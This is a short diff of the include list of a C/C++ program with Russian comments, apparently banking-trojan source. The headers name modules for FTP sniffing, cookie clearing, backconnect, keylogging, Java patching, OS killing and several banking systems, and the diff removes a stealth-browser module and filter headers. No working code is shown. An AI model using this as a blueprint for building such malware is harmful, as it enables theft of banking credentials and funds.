@@ -23,7 +23,6 @@
 #include "FtpSniffer.h" // Перехват фтп трафика
 #include "coocksol.h"  // Очистка куков ИЕ и ФФ
 #include "BackConnect.h" // Модуль обратной связи
-#include "StealthBrowser.h" // Скрытый браузер
 
 
 #include "KeyLogSystems.h" 
@@ -52,7 +51,6 @@
 #include "java_patcher.h"
 #include "JavaConfig.h"
 
-//#include "AzConfig.h"
 
 #include "KillOs_Reboot.h"
 #include "BBSCBank.h"
@@ -65,8 +63,6 @@
 #include "IBankSystem.h"
 #include "avangard.h"
 #include "ifobs.h"
-
-#include "FgrFilters.h"
 
 
 #include "HostsAutoUpdate.h"
